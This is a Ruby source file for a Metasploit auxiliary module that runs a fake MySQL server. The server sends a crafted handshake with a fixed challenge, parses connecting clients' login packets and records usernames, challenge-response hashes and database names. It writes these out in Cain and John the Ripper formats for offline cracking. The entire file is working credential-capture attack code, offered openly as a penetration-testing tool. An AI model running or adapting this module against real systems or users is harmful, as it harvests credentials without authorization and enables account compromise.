##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::TcpServer
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'           => 'Authentication Capture: MySQL',
      'Description'    => %q{
        This module provides a fake MySQL service that is designed to
        capture authentication credentials. It captures	challenge and
        response pairs that can be supplied to Cain or JtR for cracking.
      },
      'Author'         => 'Patrik Karlsson <patrik[at]cqure.net>',
      'License'        => MSF_LICENSE,
      'Actions'        => [ [ 'Capture' ] ],
      'PassiveActions' => [ 'Capture' ],
      'DefaultAction'  => 'Capture'
    )

    register_options(
      [
        OptPort.new('SRVPORT', [ true, "The local port to listen on.", 3306 ]),
        OptString.new('CHALLENGE', [ true, "The 16 byte challenge", "112233445566778899AABBCCDDEEFF1122334455" ]),
        OptString.new('SRVVERSION', [ true, "The server version to report in the greeting response", "5.5.16" ]),
        OptString.new('CAINPWFILE',  [ false, "The local filename to store the hashes in Cain&Abel format", nil ]),
        OptString.new('JOHNPWFILE',  [ false, "The prefix to the local filename to store the hashes in JOHN format", nil ]),
      ], self.class)
  end

  def setup
    super
    @state = {}
  end

  def run
    if datastore['CHALLENGE'].to_s =~ /^([a-fA-F1-9]{40})$/
      @challenge = [ datastore['CHALLENGE'] ].pack("H*")
    else
      print_error("CHALLENGE syntax must match 112233445566778899AABBCCDDEEFF1122334455")
      return
    end
    @version = datastore['SRVVERSION']
    print_status("Listening on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}...")
    exploit()
  end

  def on_client_connect(c)
    @state[c] = {
      :name    => "#{c.peerhost}:#{c.peerport}",
      :ip      => c.peerhost,
      :port    => c.peerport,
    }
    mysql_send_greeting(c)
  end

  def mysql_send_greeting(c)
    # http://forge.mysql.com/wiki/MySQL_Internals_ClientServer_Protocol#Handshake_Initialization_Packet

    length = 68 + @version.length
    packetno = 0
    chall = String.new(@challenge)
    data = [
      ( length & 0x00FFFFFF ) + ( packetno << 24 ), # length + packet no
      10, # protocol version: 10e
      @version, # server version: 5.5.16 (unless changed)
      rand(9999) + 1, # thread id
      chall.slice!(0,8), # the first 8 bytes of the challenge
      0x00, # filler
      0xfff7, # server capabilities
      0x21, # server language: UTF8
      0x0002, # server status
      "0f801500000000000000000000", # filler
      chall.slice!(0,12),
      "mysql_native_password"
    ].pack("VCZ*VA*CnCvH*Z*Z*")
    c.put data
  end

  def mysql_process_login(data, info)
    length = ( data.slice(0,4).unpack("V")[0] & 0x00FFFFFF )
    packetno = ( data.slice!(0,4).unpack("V")[0] & 0xFF000000 ) >> 24
    flags = data.slice!(0,2).unpack("v")[0]
    if ( flags & 0x8000 ) != 0x8000
      info[:errors] << "Unsupported protocol detected"
      return info
    end

    # we're dealing with the 4.1+ protocol
    extflags = data.slice!(0,2).unpack("v")[0]
    maxpacket= data.slice!(0,4).unpack("N")[0]
    charset = data.slice!(0,1).unpack("C")[0]

    # slice away 23 bytes of filler
    data.slice!(0,23)

    info[:username] = data.slice!(0, data.index("\x00")+1).unpack("Z*")[0]
    response_len = data.slice!(0,1).unpack("C")[0]
    if response_len != 20
      return
    end
    info[:response] = data.slice!(0, 20).unpack("A*")[0]

    if ( flags & 0x0008 ) == 0x0008
      info[:database] = data.slice!(0, data.index("\x00")).unpack("A*")[0]
    end
    info
  end

  def mysql_send_error(c, msg)
    length = 9 + msg.length
    packetno = 2
    data = [
      ( length & 0x00FFFFFF ) + ( packetno << 24 ), # length + packet no
      0xFF, # field count, always: ff
      1045, # error code
      0x23, # sqlstate marker, always '#'
      "28000", # sqlstate
      msg
    ].pack("VCvCA*A*")
    c.put data
  end

  def on_client_data(c)
    info = { :errors => [] }
    data = c.get_once
    return if not data

    mysql_process_login(data, info)
    if info[:errors] and not info[:errors].empty?
      print_error("#{@state[c][:name]} #{info[:errors].join("\n")}")
    elsif info[:username] and info[:response]
      mysql_send_error(c, "Access denied for user '#{info[:username]}'@'#{c.peerhost}' (using password: YES)")
      if info[:database]
        print_status("#{@state[c][:name]} - User: #{info[:username]}; Challenge: #{@challenge.unpack('H*')[0]}; Response: #{info[:response].unpack('H*')[0]}; Database: #{info[:database]}")
      else
        print_status("#{@state[c][:name]} - User: #{info[:username]}; Challenge: #{@challenge.unpack('H*')[0]}; Response: #{info[:response].unpack('H*')[0]}")
      end
      hash_line = "#{info[:username]}:$mysql$#{@challenge.unpack("H*")[0]}$#{info[:response].unpack('H*')[0]}"
      report_auth_info(
        :host  => c.peerhost,
        :port => datastore['SRVPORT'],
        :sname => 'mysql_client',
        :user => info[:username],
        :pass => hash_line,
        :type => "mysql_hash",
        :proof => info[:database] ? info[:database] : hash_line,
        :source_type => "captured",
        :active => true
      )

      if (datastore['CAINPWFILE'])
        fd = ::File.open(datastore['CAINPWFILE'], "ab")
        fd.puts(
        [
          info[:username],
          "NULL",
          info[:response].unpack('H*')[0],
          @challenge.unpack('H*')[0],
          "SHA1"
        ].join("\t").gsub(/\n/, "\\n")
        )
        fd.close
      end

      if(datastore['JOHNPWFILE'])
        john_hash_line = "#{info[:username]}:$mysqlna$#{@challenge.unpack("H*")[0]}*#{info[:response].unpack('H*')[0]}"
        fd = ::File.open(datastore['JOHNPWFILE'] + '_mysqlna' , "ab")
        fd.puts john_hash_line
        fd.close
      end
    else
      mysql_send_error(c, "Access denied for user '#{info[:username]}'@'#{c.peerhost}' (using password: NO)")
    end
    c.close
  end

  def on_client_close(c)
    @state.delete(c)
  end
end
